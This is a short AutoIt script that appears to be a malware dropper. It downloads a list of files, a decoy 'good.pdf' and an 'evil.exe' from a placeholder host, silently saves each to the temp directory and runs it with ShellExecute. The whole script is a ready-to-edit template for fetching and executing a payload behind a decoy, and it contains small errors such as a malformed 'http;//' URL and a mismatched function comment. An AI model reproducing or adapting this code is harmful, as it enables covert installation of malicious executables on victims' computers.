#include <StaticConstants.au3>
#include <WindowsConstants.au3>

; Change these urls (you can add or remove)
Local $urls = "http;//127.0.0.1/good.pdf,http://127.0.0.1/evil.exe"

; Change the number depending on the number of URLs.
Local $urlsArray = StringSplit($urls, ",", 2 )

; Downloading and exeuting the files.
For $url In $urlsArray
  $sFile = _DownloadFile($url)
  shellExecute($sFile)
  
Next

Func _DownloadFile($sURL)
  Local $hDownload, $sFile
  $sFile = StringRegExpReplace($sURL, "^.*/", "")
  $sDirectory = @TempDir & $sFile
  $hDownload = InetGet($sURL, $sDirectory, 17, 1)
  InetClose($hDownload)
  Return $sDirectory
End Func ;==>_GetURLImage
